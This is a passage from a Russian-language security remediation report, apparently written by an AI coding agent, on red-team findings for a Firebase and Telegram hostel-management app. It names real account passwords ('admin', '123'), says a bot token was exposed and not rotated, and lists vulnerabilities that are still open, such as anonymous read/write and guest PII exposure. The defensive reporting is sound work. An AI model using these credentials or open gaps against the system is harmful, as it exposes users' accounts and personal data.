переезжает в рамках трека Firebase Auth. Отмечено: основной бот-токен фактически был анонимно читаем,
поэтому его ротация теперь обоснованнее (по твоему решению — не меняли).

---

# Волна 2 — исправления по итогам независимого red-team (2026-08-20)

Запущены 3 атакующих агента (только read-only/статика). Нашли реальные пробелы, включая **живой CRITICAL**. Исправлено и задеплоено:

- **[CRITICAL] `users.pass` читается анонимно** (`admin`=sha256("admin"), `nargiza`="123", …) → вход админом за минуту. Мой C4-фикс был неполным. Теперь: легаси-хеш уносится в закрытую `userSecrets.legacyPass`, `authenticateUser` **самоудаляет** `pass` при входе, добавлена одноразовая `migrateLegacyPass` для спящих аккаунтов, клиент больше не дублирует `pass`. **Требует однократного запуска миграции** (см. команду в переписке) — до неё 6/6 аккаунтов ещё экспонированы.
- **[HIGH] `escapeTg` — клиентское экранирование обходится** анонимным вызовом `sendTelegramMessage` с готовым HTML. Добавлена **серверная** `sanitizeTgHtml` (whitelist тегов форматирования, `<a href>` остаётся экранирован). Плюс закрыты пропущенные `escapeTg` в `useCadastreAlerts`, `useExpenseActions:81`.
- **[регрессия] `isBlockedIcalHost` резал ВСЕ домены** (я сломал iCal) — исправлено (isPrivateIp только для литеральных IP); IPv6 NAT64/compat/mapped; `will-redirect` в hardening окон.
- **[регрессия/availability] `trustedClientIp` (последний XFF)** на gen1 = общий Google-IP → риск глобальной блокировки входа/броней. Откат на клиентский хоп (безопасно для доступности).
- **[HIGH-финансы] `transferBalance`** обходил мой H7 (обнуление долга без аудита через перенос + удаление «пустышки»). Добавлен аудит + запрет удаления договора с непогашенным сальдо. Отклонение отрицательных сплитов оплаты (десинхрон кассы). Аудит `handleAdminAdjustDebt`.
- **[фундамент миграции]** `authenticateUser` выдаёт кастомный токен Firebase с claims (`role`/`hostelId`), клиент входит по нему с fallback на аноним. Правила пока не требуют claims (не ломает старые сборки) — это шаг к серверной проверке ролей (C1–C7).

Проверено red-team как SOLID (сломать не удалось): `buildEmehmonUrl`, `isEmehmonUrl`, `safeLookup` (SSRF resolve-gate), pending-payments IPC, `telegramWebhook` fail-closed+safeEqual, `getFreeBeds`, `scanPassport`, Secret Manager (токены реально удалены из Firestore), append-only auditLog (update/delete запрещены).

**Всё ещё открыто (корень, нужен трек Firebase Auth):** C1/C7 — аноним = полный read/write; `guests`/`users` PII читаются/пишутся анонимно; forge `auditLog`/`sessions` create; открытый relay произвольных `chatIds`; финансовые UI-guard'ы обходятся через SDK. Кастом-токены задеплоены как фундамент; следующий шаг — ужесточение правил после раскатки клиентов.
